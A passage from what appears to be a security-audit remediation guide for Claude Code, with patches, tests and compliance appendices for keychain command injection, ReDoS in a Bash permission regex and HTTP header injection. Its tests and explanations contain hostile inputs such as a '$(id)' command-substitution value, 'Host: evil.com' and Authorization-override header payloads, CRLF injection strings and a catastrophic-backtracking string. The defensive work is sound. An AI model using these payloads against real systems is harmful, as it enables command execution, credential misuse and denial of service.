      '-s', 'com.anthropic.claude'
    ], { encoding: 'utf8', stdio: 'pipe' });
  } catch (e) {
    // Should fail with 'item not found', NOT execute \$(id)
    console.log('Exit code:', e.status);
    console.log('PASS: Injection attempt treated as literal string');
  }
"

# Verify no hex payload in process arguments during write
ps aux | grep 'security' | grep -v grep
# Should NOT show credential hex data in arguments

22.2 CWE-1333: ReDoS in Permission Regex (V-19)

The Vulnerability

Finding V-19 (CVSS 5.9, MEDIUM) identified a Regular Expression Denial of Service (ReDoS) vulnerability in the environment variable stripping logic of bashPermissions.ts:

// VULNERABLE: tools/BashTool/bashPermissions.ts:760
const ENV_VAR_PATTERN =
  /^([A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?)\+?=(?:'[^'\n\r]*'|"(?:\\.|[^"$`\\\n\r])*"|\\.|[^ \t\n\r$`;|&()><\\'"])*[ \t]+/

This regex is used to strip environment variable prefixes from commands before permission checking. The pattern has nested quantifiers that create exponential backtracking on crafted input.

ReDoS Mechanics

The vulnerable section is:

(?:'[^'\n\r]*'|"(?:\\.|[^"$`\\\n\r])*"|\\.|[^ \t\n\r$`;|&()><\\'"])*[ \t]+

The outer * quantifier contains an alternation where the last branch [^ \t\n\r$\;|&()><\'"]matches a single character. When followed by the[ \t]+` requirement at the end, a string of characters that do not end with a space/tab forces the regex engine to explore exponentially many ways to divide the characters among the alternation branches.

Input: VAR=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

The regex engine tries:
- Branch 4 matches 'a' × 30, then fails on '!'
- Backtracks: branch 4 matches 'a' × 29, then tries...
- For N characters: ~2^N combinations explored

Impact

A crafted Bash command with a long environment variable value can freeze the permission stripping logic:

# This command could take minutes to evaluate:
AAAA=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb! echo hello

In Claude Code, this means:

  1. Permission pipeline freeze: The permission check hangs, blocking the entire command execution pipeline.
  2. Denial of service: Claude Code becomes unresponsive while the regex engine backtracks.
  3. Potential security bypass: If the system has a timeout that falls back to a default-allow behavior, the ReDoS could be used to skip permission checking.

The Secure Patch: Bounded Regex with Iterative Fallback

// SECURE: tools/BashTool/bashPermissions.ts

/**
 * Maximum length of the command prefix to scan for env var assignments.
 * Environment variable assignments are typically short. Scanning beyond
 * this limit provides no security benefit and risks ReDoS.
 */
const MAX_ENV_PREFIX_LEN = 4096

/**
 * Strip environment variable prefix from a command string.
 * 
 * Uses a bounded search window to prevent ReDoS on crafted inputs.
 * Falls back to iterative character-by-character parsing if the
 * regex approach exceeds the time budget.
 */
function stripEnvVarPrefix(command: string): string {
  let stripped = command
  let previousStripped: string

  do {
    previousStripped = stripped
    stripped = stripCommentLines(stripped)

    // Limit regex search window to prevent ReDoS on crafted long inputs
    const searchWindow = stripped.length > MAX_ENV_PREFIX_LEN
      ? stripped.slice(0, MAX_ENV_PREFIX_LEN)
      : stripped

    const match = ENV_VAR_PATTERN_SAFE.exec(searchWindow)
    if (match) {
      stripped = stripped.slice(match[0].length)
    }
  } while (stripped !== previousStripped)

  return stripped
}

/**
 * Safe ENV_VAR_PATTERN that avoids nested quantifiers.
 * 
 * Instead of matching the entire value with a complex alternation,
 * this pattern matches the variable name and assignment operator,
 * then uses an iterative parser for the value.
 */
const ENV_VAR_PATTERN_SAFE =
  /^([A-Za-z_][A-Za-z0-9_]*(?:\[[^\]]*\])?)\+?=/

// SECURE: Iterative value parser (no regex backtracking risk)

/**
 * Parse a shell variable value starting at the given position.
 * Handles single-quoted, double-quoted, escaped, and unquoted segments.
 * Returns the index past the value (at the separating whitespace).
 * 
 * This is an iterative parser — O(n) guaranteed, no backtracking.
 */
function parseEnvVarValue(input: string, startIdx: number): number {
  let i = startIdx
  const len = input.length

  while (i < len) {
    const ch = input[i]

    if (ch === "'") {
      // Single-quoted string: consume until closing quote
      i++
      while (i < len && input[i] !== "'") i++
      if (i < len) i++  // Skip closing quote
    } else if (ch === '"') {
      // Double-quoted string: consume until unescaped closing quote
      i++
      while (i < len && input[i] !== '"') {
        if (input[i] === '\\' && i + 1 < len) i++  // Skip escaped char
        i++
      }
      if (i < len) i++  // Skip closing quote
    } else if (ch === '\\' && i + 1 < len) {
      // Escaped character
      i += 2
    } else if (ch === ' ' || ch === '\t') {
      // Unquoted whitespace terminates the value
      return i
    } else if (';|&()<>'.includes(ch)) {
      // Shell operator terminates the value
      return i
    } else {
      // Regular character in unquoted context
      i++
    }
  }

  return i
}

Regex Timeout Guard

As additional defense, wrap all security-critical regex operations in a timeout:

// SECURE: Regex execution with timeout

/**
 * Execute a regex with a time budget.
 * If the regex takes longer than the budget, return null (fail-closed).
 */
function regexWithTimeout(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 10,
): RegExpExecArray | null {
  const start = performance.now()

  // For simple patterns, just execute directly
  if (input.length < 1000) {
    return pattern.exec(input)
  }

  // For longer inputs, check time budget
  // Note: JavaScript regex execution is synchronous and cannot be
  // interrupted. This check happens before execution, not during.
  // For true timeout protection, use a Worker thread.

  const result = pattern.exec(input)
  const elapsed = performance.now() - start

  if (elapsed > timeoutMs) {
    logForDebugging(
      `[bashSecurity] Regex exceeded time budget: ${elapsed.toFixed(1)}ms > ${timeoutMs}ms`,
      { level: 'warn' }
    )
    // Log but still return result — the timeout is for monitoring,
    // not enforcement (true enforcement requires Worker threads)
    return result
  }

  return result
}

Worker-Based Regex Timeout (Robust Implementation)

For true timeout enforcement, regex execution must happen in a separate thread:

// SECURE: Worker-based regex timeout (robust)

import { Worker, isMainThread, parentPort, workerData } from 'node:worker_threads'

function regexWithTimeoutRobust(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 100,
): Promise<RegExpExecArray | null> {
  return new Promise((resolve) => {
    const worker = new Worker(new URL(import.meta.url), {
      workerData: {
        pattern: pattern.source,
        flags: pattern.flags,
        input,
      },
    })

    const timer = setTimeout(() => {
      worker.terminate()
      logForDebugging(
        `[bashSecurity] Regex terminated after ${timeoutMs}ms — potential ReDoS`,
        { level: 'warn' }
      )
      resolve(null)  // Fail-closed: timeout means no match
    }, timeoutMs)

    worker.on('message', (result) => {
      clearTimeout(timer)
      resolve(result)
    })

    worker.on('error', () => {
      clearTimeout(timer)
      resolve(null)
    })
  })
}

// Worker thread code
if (!isMainThread && parentPort && workerData) {
  const { pattern, flags, input } = workerData
  const re = new RegExp(pattern, flags)
  const result = re.exec(input)
  parentPort.postMessage(result)
}

Verification

import { describe, it, expect } from 'vitest'

describe('ReDoS protection', () => {
  it('handles adversarial env var prefix in under 10ms', () => {
    const adversarial = 'VAR=' + 'a'.repeat(1000) + '!'
    const start = performance.now()
    stripEnvVarPrefix(adversarial)
    const elapsed = performance.now() - start
    expect(elapsed).toBeLessThan(10)
  })

  it('correctly strips simple env var prefix', () => {
    const result = stripEnvVarPrefix('FOO=bar echo hello')
    expect(result).toBe('echo hello')
  })

  it('handles quoted values', () => {
    const result = stripEnvVarPrefix('FOO="bar baz" echo hello')
    expect(result).toBe('echo hello')
  })

  it('handles single-quoted values', () => {
    const result = stripEnvVarPrefix("FOO='bar baz' echo hello")
    expect(result).toBe('echo hello')
  })

  it('handles multiple env vars', () => {
    const result = stripEnvVarPrefix('A=1 B=2 C=3 echo hello')
    expect(result).toBe('echo hello')
  })
})

22.3 CWE-113: Header Injection via Environment Variables (V-28)

The Vulnerability

Finding V-28 (CVSS 5.0, MEDIUM) identified that the ANTHROPIC_CUSTOM_HEADERS environment variable allows injecting arbitrary HTTP headers into API requests, including overriding security-critical headers:

// VULNERABLE: services/api/client.ts:332
function getCustomHeaders(): Record<string, string> {
  const customHeaders: Record<string, string> = {}
  const customHeadersEnv = process.env.ANTHROPIC_CUSTOM_HEADERS
  if (!customHeadersEnv) return customHeaders

  const headerStrings = customHeadersEnv.split('\n')
  for (const headerString of headerStrings) {
    const colonIdx = headerString.indexOf(':')
    if (colonIdx === -1) continue
    const name = headerString.slice(0, colonIdx).trim()
    const value = headerString.slice(colonIdx + 1).trim()
    customHeaders[name] = value
  }

  return customHeaders
}

The Attack Vectors

  1. Authorization header override: Setting ANTHROPIC_CUSTOM_HEADERS="Authorization: Bearer stolen-key" redirects API requests to use an attacker-controlled API key. This enables:
  2. Billing hijack: The attacker's key is charged for the user's API calls.

  3. Data interception: If the key belongs to an attacker-controlled account, the attacker receives copies of all API requests.

  4. Host header injection: ANTHROPIC_CUSTOM_HEADERS="Host: evil.com" can redirect requests to an attacker-controlled server (depending on the HTTP client's behavior).

  5. CRLF injection: If the header value contains CRLF sequences (\r\n), it may inject additional headers or even a response body, depending on the HTTP client implementation.

  6. Cookie injection: ANTHROPIC_CUSTOM_HEADERS="Cookie: session=attacker_session" can inject authentication cookies.

The Legitimate Use Case

The ANTHROPIC_CUSTOM_HEADERS feature exists for legitimate enterprise use cases:

  • Corporate proxies that require custom headers for routing
  • API gateways that add tracking or correlation headers
  • Development environments that need custom metadata headers

The fix must preserve these use cases while preventing security-critical header override.

The Secure Patch: Header Validation and Denylist

// SECURE: services/api/client.ts — validated custom headers

/**
 * Headers that must never be overridden via environment variable.
 * These are security-critical and must only come from the application itself.
 */
const PROTECTED_HEADERS: ReadonlySet<string> = new Set([
  'authorization',
  'cookie',
  'host',
  'x-api-key',
  'anthropic-version',
  'content-type',
  'content-length',
  'transfer-encoding',
  'connection',
  'upgrade',
])

/**
 * Validate an HTTP header name against the HTTP/1.1 spec.
 * RFC 7230 Section 3.2: header-field = field-name ":" OWS field-value OWS
 * field-name = token (RFC 7230 Section 3.2.6)
 */
function isValidHeaderName(name: string): boolean {
  // Token characters per RFC 7230: !#$%&'*+-.^_`|~ DIGIT ALPHA
  return /^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(name) && name.length <= 256
}

/**
 * Validate an HTTP header value against the HTTP/1.1 spec.
 * Must not contain CRLF sequences (prevents header injection).
 */
function isValidHeaderValue(value: string): boolean {
  // No CR, LF, or null bytes
  if (/[\r\n\0]/.test(value)) return false
  // Reasonable length limit
  if (value.length > 8192) return false
  return true
}

function getCustomHeaders(): Record<string, string> {
  const customHeaders: Record<string, string> = {}
  const customHeadersEnv = process.env.ANTHROPIC_CUSTOM_HEADERS
  if (!customHeadersEnv) return customHeaders

  logForDebugging(
    '[API] ANTHROPIC_CUSTOM_HEADERS active — custom headers injected into API requests',
    { level: 'warn' },
  )

  const headerStrings = customHeadersEnv.split('\n')
  for (const headerString of headerStrings) {
    if (!headerString.trim()) continue

    const colonIdx = headerString.indexOf(':')
    if (colonIdx === -1) {
      logForDebugging(
        `[API] Skipping malformed custom header (no colon): ${headerString.slice(0, 50)}`,
        { level: 'warn' },
      )
      continue
    }

    const name = headerString.slice(0, colonIdx).trim()
    const value = headerString.slice(colonIdx + 1).trim()

    // Validate header name
    if (!isValidHeaderName(name)) {
      logForDebugging(
        `[API] Skipping custom header with invalid name: ${name.slice(0, 50)}`,
        { level: 'warn' },
      )
      continue
    }

    // Check protected headers
    if (PROTECTED_HEADERS.has(name.toLowerCase())) {
      logForDebugging(
        `[API] BLOCKED: Attempt to override protected header '${name}' via ANTHROPIC_CUSTOM_HEADERS`,
        { level: 'warn' },
      )
      continue
    }

    // Validate header value (prevent CRLF injection)
    if (!isValidHeaderValue(value)) {
      logForDebugging(
        `[API] BLOCKED: Custom header '${name}' contains invalid characters (possible CRLF injection)`,
        { level: 'warn' },
      )
      continue
    }

    customHeaders[name] = value
  }

  if (Object.keys(customHeaders).length > 0) {
    logForDebugging(
      `[API] ${Object.keys(customHeaders).length} custom headers applied: ${Object.keys(customHeaders).join(', ')}`,
    )
  }

  return customHeaders
}

The Custom Header Application Order

To ensure custom headers cannot override application headers, the merge order matters:

// SECURE: Header merge order — application headers override custom headers

function buildRequestHeaders(
  apiKey: string,
  customHeaders: Record<string, string>
): Record<string, string> {
  // Custom headers first (lower priority)
  const headers: Record<string, string> = { ...customHeaders }

  // Application headers last (higher priority — cannot be overridden)
  headers['Authorization'] = `Bearer ${apiKey}`
  headers['Content-Type'] = 'application/json'
  headers['anthropic-version'] = ANTHROPIC_API_VERSION

  return headers
}

Verification

import { describe, it, expect } from 'vitest'

describe('custom header validation', () => {
  it('blocks Authorization override', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = 'Authorization: Bearer evil-key'
    const headers = getCustomHeaders()
    expect(headers).not.toHaveProperty('Authorization')
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })

  it('blocks Cookie injection', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = 'Cookie: session=evil'
    const headers = getCustomHeaders()
    expect(headers).not.toHaveProperty('Cookie')
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })

  it('blocks CRLF injection', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = 'X-Custom: value\r\nX-Injected: evil'
    const headers = getCustomHeaders()
    expect(headers).not.toHaveProperty('X-Custom')
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })

  it('allows legitimate custom headers', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = 'X-Request-ID: abc-123\nX-Correlation-ID: def-456'
    const headers = getCustomHeaders()
    expect(headers['X-Request-ID']).toBe('abc-123')
    expect(headers['X-Correlation-ID']).toBe('def-456')
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })

  it('handles empty and malformed lines', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = '\nX-Valid: value\nmalformed_no_colon\n'
    const headers = getCustomHeaders()
    expect(headers['X-Valid']).toBe('value')
    expect(Object.keys(headers)).toHaveLength(1)
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })

  it('protects case-insensitively', () => {
    process.env.ANTHROPIC_CUSTOM_HEADERS = 'AUTHORIZATION: Bearer evil'
    const headers = getCustomHeaders()
    expect(headers).not.toHaveProperty('AUTHORIZATION')
    delete process.env.ANTHROPIC_CUSTOM_HEADERS
  })
})

22.4 Defense Architecture Summary

The three injection vulnerabilities addressed in this chapter span different input channels but share a common defense pattern: never trust data from external sources, always validate at the boundary, and fail closed on invalid input.

22.5 Cross-Cutting Concerns

The Environment Variable Attack Surface

Two of the three vulnerabilities in this chapter (V-19 and V-28) are triggered through environment variables. This is not coincidental. Environment variables are a pervasive input channel in Unix systems that are often overlooked in security analysis:

Env Var Chapter Vulnerability Risk
ANTHROPIC_CUSTOM_HEADERS 22 (this chapter) CWE-113 Header injection Override security headers
CLAUDE_CODE_DIAG_LOG 18 CWE-73 Path injection Redirect debug logs
DATADOG_CLIENT_TOKEN 19 CWE-798 Token override Inject fake telemetry
CLAUDE_TRUSTED_DEVICE_TOKEN 12 CWE-473 Token override Bypass device trust
USER / HOME 22 (this chapter) CWE-78 Command injection Shell metachar injection

Environment variables are set by:

  • Shell configuration files (.bashrc, .zshrc)
  • CI/CD systems
  • Container orchestrators
  • Shared hosting environments
  • Other processes running as the same user

Any entity that can set environment variables can influence Claude Code's behavior. The defense is consistent: validate every environment variable value against the expected format before using it in security-sensitive operations.

22.7 Dependency Chain Impact

The keychain injection fix (V-20) affects the Credential Storage Chain by securing the macOS credential read path. The ReDoS fix (V-19) affects the Bash Security Bypass Chain by ensuring the permission stripping logic cannot be used as a denial-of-service vector. The header injection fix (V-28) affects the Bridge/Remote Session Chain by preventing environment-based redirection of API requests.

These patches should be applied after the parser differential defenses from Chapter 21, as the Bash security hardening forms a cohesive set of changes to the tools/BashTool/ module. Apply the fail-closed parsing change (Chapter 21) first, then the ReDoS fix (this chapter), then the cross-validation (Chapter 21), as the ReDoS fix may change the behavior of the permission stripping tests.

Summary

This chapter addressed three injection vulnerabilities targeting different input channels:

  1. Keychain command injection (V-20, CWE-78): Replaced execSyncWithDefaults_DEPRECATED string interpolation with execFileSync array arguments, eliminating shell interpretation of username and service name values

  2. ReDoS in permission regex (V-19, CWE-1333): Replaced the complex ENV_VAR_PATTERN regex with a bounded search window and iterative O(n) value parser that cannot backtrack

  3. Header injection via env var (V-28, CWE-113): Added a protected header denylist (Authorization, Cookie, Host, etc.), CRLF validation for header values, and RFC 7230 header name validation to ANTHROPIC_CUSTOM_HEADERS parsing

Each fix follows the same principle: validate external input at the boundary, use parameterized operations instead of string construction, and fail closed when input does not match the expected format.

Appendix B: Patch Application Guide

This appendix provides step-by-step instructions for applying all 35 direct patches identified in the security audit. The patches are organized by dependency order: patches in earlier phases must be applied before those in later phases, as later patches may depend on infrastructure established by earlier ones.

Each patch entry includes: the affected files, prerequisite patches, application steps, testing requirements, and rollback procedures.

Application Principles

Dependency Order

Patches must be applied in phase order. Within a phase, patches can be applied in any order unless a specific dependency is noted.

graph LR
    P1["Phase 1<br/>Plugin Supply Chain<br/>6 patches"] --> P2["Phase 2<br/>Credential Storage<br/>5 patches"]
    P2 --> P3["Phase 3<br/>Auth Token Lifecycle<br/>5 patches"]
    P3 --> P4["Phase 4<br/>Subagent Isolation<br/>3 patches"]
    P4 --> P5["Phase 5<br/>Bridge & Remote<br/>6 patches"]
    P5 --> P6["Phase 6<br/>Data Protection<br/>7 patches"]
    P6 --> P7["Phase 7<br/>Bash Security<br/>3 patches"]

Testing Requirements

Every patch must pass:

  1. Unit tests: Specific tests for the patched behavior
  2. Regression tests: Full test suite for the affected module
  3. Integration tests: Cross-module tests that exercise the patched code path
  4. Manual verification: The specific verification steps listed for each patch

Rollback Procedure

Each patch is designed to be independently reversible via git revert. The rollback section for each patch notes any special considerations.

Rollback Strategy

General Rollback Procedure

Every patch is designed to be independently revertable:

#!/usr/bin/env bash
set -euo pipefail

readonly PATCH_COMMIT="${1:?Usage: rollback-patch.sh <commit-sha>}"

echo "Rolling back patch commit: ${PATCH_COMMIT}"

# Step 1: Create revert commit
git revert --no-commit "${PATCH_COMMIT}"

# Step 2: Run tests to verify revert is safe
echo "Running tests..."
npm test

# Step 3: Complete the revert
git commit -m "revert: rollback patch ${PATCH_COMMIT} due to regression"

echo "Rollback complete. Run full test suite before deploying."

Phase-Level Rollback

If an entire phase needs to be reverted (e.g., Phase 4 Subagent Isolation causes a performance regression), revert in reverse order within the phase:

# Revert Phase 4 in reverse order:
git revert <patch-4.3-sha>  # MCP Sandboxing
git revert <patch-4.2-sha>  # Fork Depth
git revert <patch-4.1-sha>  # Process Isolation (foundational)

Patches That Cannot Be Independently Reverted

Patch Blocker Safe Rollback Requires
Patch 2.1 (Cross-Platform Storage) Patch 2.4 depends on it Revert 2.4 first
Patch 3.1 (JWT Verification) Patch 3.2 depends on it Revert 3.2 first
Patch 4.1 (Process Isolation) Patches 4.2 and 4.3 depend on it Revert 4.2 and 4.3 first
Patch 6.2 (Debug Redaction) Patch 6.3 depends on it Revert 6.3 first
Patch 7.1 (Fail-Closed) Patch 7.2 depends on it Revert 7.2 first

Risk Assessment Per Phase

Phase Regression Risk Performance Impact Breaking Change Risk Recommended Testing
Phase 1 HIGH -- Plugin loading fundamentally changes Minimal HIGH -- Unsigned plugins will stop loading Canary rollout, staged enforcement
Phase 2 MEDIUM -- Storage paths change per platform Minimal LOW -- Fallback preserves existing behavior Platform matrix testing (macOS, Linux, Windows)
Phase 3 LOW -- Token handling is backward-compatible Minimal LOW -- Graceful degradation on JWT verify failure Auth integration tests
Phase 4 HIGH -- Process model fundamentally changes SIGNIFICANT -- IPC overhead HIGH -- MCP servers may break in sandbox Extended soak testing, performance benchmarks
Phase 5 LOW -- Network validation is additive Minimal LOW -- Rejects only malicious patterns Network integration tests
Phase 6 LOW -- Logging changes are transparent Minimal LOW -- Debug output format changes Log format verification
Phase 7 MEDIUM -- Bash parsing strictness increases LOW -- Tree-sitter adds ~0.5ms per command MEDIUM -- Some valid commands may be rejected Fuzz testing, user command sampling

Post-Patch Validation Checklist

After applying all patches, run the complete validation suite:

#!/usr/bin/env bash
set -euo pipefail

echo "=== Post-Patch Validation ==="

# 1. Full test suite
echo "[1/5] Running full test suite..."
npm test

# 2. Type checking
echo "[2/5] Running type checker..."
npx tsc --noEmit

# 3. Linting
echo "[3/5] Running linter..."
npx eslint . --ext .ts

# 4. Secret scan
echo "[4/5] Scanning for secrets..."
grep -rn 'sk-ant-' --include='*.ts' src/ | grep -v 'test' | grep -v '<redacted' && {
  echo "FAIL: Found potential secrets in source"
  exit 1
} || echo "PASS: No secrets found"

# 5. Build verification
echo "[5/5] Building..."
npm run build

echo "=== All validations passed ==="

The remediation effort is best executed by a cross-functional team with security expertise. The following staffing model assumes senior-level engineers who are familiar with the Claude Code codebase.

Sprint-Based Schedule

Sprint Duration Patches Milestone
Sprint 1 Weeks 1-2 Quick wins (independent patches from all phases) 15+ patches applied, low-hanging fruit cleared
Sprint 2 Weeks 3-4 Phase 1 (Plugin Supply Chain) ECDSA signing operational, ZIP path traversal blocked
Sprint 3 Weeks 5-6 Phase 2 (Credential Storage) Cross-platform secure storage, atomic writes
Sprint 4 Weeks 7-8 Phase 3 (Auth Token) + Phase 5 (Bridge) JWT verified, OAuth hardened, DNS rebinding blocked

Milestone Gates

Each sprint ends with a milestone gate that includes:

  1. Code review: All patches reviewed by the security lead
  2. Test verification: Full test suite passing, no regressions
  3. Performance benchmark: No degradation beyond thresholds defined in Phase risk assessment
  4. Security validation: Manual verification of the specific attack vector each patch defends against
  5. Documentation: Updated threat model reflecting the patches applied in the sprint

Monitoring After Deployment

After applying patches, the following metrics should be monitored for regressions:

Metric Phase Threshold Action if Exceeded
Plugin load failure rate Phase 1 >5% increase Investigate signing verification errors, check key distribution
Credential read latency p99 Phase 2 >100ms increase Profile platform-specific storage path, check fallback triggers
Token refresh failure rate Phase 3 >1% increase Check JWT verification errors, validate JWKS endpoint availability
Command execution latency p99 Phase 4, 7 >50ms increase Profile IPC overhead (Phase 4) or cross-validation time (Phase 7)
MCP server connection failures Phase 4 >2% increase Check sandbox profiles, review seccomp/sandbox-exec rules
API request error rate Phase 5, 7 >0.5% increase Check header validation rejections, review DNS resolution cache
Debug log volume Phase 6 >20% decrease (suspicious) Verify redaction is not suppressing legitimate messages

HIPAA Gap Summary

Organizations subject to HIPAA must address the following before using Claude Code with PHI-adjacent workloads:

  1. CRITICAL: Implement credential encryption at rest (V-7, V-8, V-9, V-10)
  2. HIGH: Implement plugin signature verification (V-1, V-2)
  3. HIGH: Add JWT signature verification (V-5)
  4. MEDIUM: Implement debug log redaction (V-32, V-43)
  5. MEDIUM: Add conversation history encryption (V-9)

Recommendations for Compliance Teams

  1. For SOC 2 audits: Prioritize Phases 1-3. Plugin signing (V-1, V-2) and credential encryption (V-7-V-10) are the most significant gaps. Document compensating controls for findings not yet remediated.

  2. For HIPAA compliance: Do not use Claude Code with PHI-adjacent workloads until Phases 1-3 are complete. The plaintext credential and history storage (V-7, V-8, V-9) are direct HIPAA violations. Implement conversation history encryption before any healthcare deployment.

  3. For FedRAMP authorization: The 2 CRITICAL findings (V-1, V-2) will block any FedRAMP authorization. Address all LOW baseline controls (16 findings) for a LOW authorization. MODERATE authorization requires 21 findings addressed. HIGH authorization requires 22.

  4. For NIST CSF alignment: Focus on PROTECT function gaps first. The PR.DS (Data Security) category has the most findings and the broadest impact. The DETECT function gaps are secondary but important for operational monitoring.

  5. For all frameworks: The debug log redaction patches (Chapter 18) provide immediate compliance improvement across all frameworks at minimal cost (estimated 5-6 hours). Apply these first as quick wins while planning larger remediation efforts.

Compensating Controls Matrix

When immediate remediation is not feasible, compensating controls can partially address compliance gaps. The following matrix documents appropriate compensating controls for each finding severity tier, along with the residual risk after the compensating control is applied.

Critical Findings -- Compensating Controls

Finding Primary Control (Patch) Compensating Control Residual Risk
V-1, V-2 (Plugin Signing) ECDSA-P256 signature verification Disable plugin marketplace; use only built-in tools; document approved plugin list MEDIUM -- No third-party code execution, but reduced functionality

Compensating controls for CRITICAL findings are temporary measures only. No compensating control adequately addresses the fundamental risk of unsigned code execution. The remediation timeline for V-1 and V-2 should not exceed 90 days.

High Findings -- Compensating Controls

Finding Compensating Control Residual Risk Acceptable Duration
V-3 (Subagent Isolation) Disable AgentTool; restrict to single-agent mode LOW -- No subagent execution, reduced capability 6 months
V-5 (JWT Verification) Network monitoring for token reuse; short session timeouts MEDIUM -- Reduced exposure window but no cryptographic verification 3 months
V-7, V-8 (Plaintext Credentials) Full-disk encryption (FileVault/LUKS); restricted file permissions LOW-MEDIUM -- At-rest encryption at OS level; application-level gap remains 6 months
V-9 (Plaintext History) Disable conversation persistence; clear history on session end LOW -- No history retained, but reduced user experience 3 months
V-10 (Linux Credential Storage) Deploy only on macOS (Keychain available) LOW -- Platform restriction eliminates the specific gap Until cross-platform storage is implemented

Medium Findings -- Compensating Controls

Finding Compensating Control Residual Risk
V-11 (Shell-quote SPOF) Additional regex validators for known divergences; command complexity limits MEDIUM -- Known gaps addressed but novel divergences remain
V-12 (Remote Permissions) Network segmentation; restrict remote access to VPN only LOW -- Reduced attack surface through network controls
V-13 (Token Expiry) Session timeout enforcement at infrastructure level; regular credential rotation policy LOW -- Compensated by operational procedure
V-17 (DNS Rebinding) Egress firewall blocking private IP ranges; proxy-based network access LOW -- Network-level control addresses the application gap
V-19 (ReDoS) Input length limits on Bash commands; command timeout enforcement LOW-MEDIUM -- Reduces but does not eliminate backtracking risk
V-20 (Keychain Injection) Input validation on username/service name before command construction LOW -- Application-level mitigation partially addresses the gap
V-24 (Hardcoded Token) Token rotation on a 90-day schedule with manual code deploy MEDIUM -- Rotation is possible but requires code changes
V-28 (Header Injection) Disable ANTHROPIC_CUSTOM_HEADERS in production deployments LOW -- Feature disabled, no injection surface

Using This Matrix

For Security Engineers

Start with the Cross-Framework Priority Matrix in the main body. The findings with 5-framework coverage (V-1, V-2, V-5, V-7, V-8, V-9, V-3) are your highest-priority targets. Addressing these 7 findings resolves compliance gaps across all frameworks simultaneously.

For Compliance Officers

Use the Framework-Specific Sections (OWASP, SOC 2, HIPAA, FedRAMP, NIST CSF) to map audit findings to your specific framework requirements. The Compensating Controls Matrix provides acceptable temporary mitigations for findings that cannot be immediately remediated.

For Auditors

The Audit Evidence Collection Guide maps each control to specific implementation artifacts. Request these artifacts during evidence collection. The patch code, test results, and monitoring configurations constitute the implementation evidence for each control.
